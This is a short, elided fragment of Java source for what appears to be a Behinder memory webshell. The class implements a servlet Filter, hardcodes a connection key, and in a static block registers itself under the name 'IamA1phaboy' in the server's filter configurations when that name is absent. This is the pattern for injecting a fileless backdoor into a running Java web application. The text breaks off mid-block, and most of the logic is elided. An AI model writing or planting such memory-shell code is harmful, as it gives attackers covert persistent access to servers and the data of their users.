...
public class BehinderMemshell implements Filter{
    private final String pa = "3728a73e6920bc79";   //a1phaboy
    static{
        try{
            final String name = "IamA1phaboy";
            ...
            if (filterConfigs.get(name) == null){
                Filter filter = new BehinderMemshell();
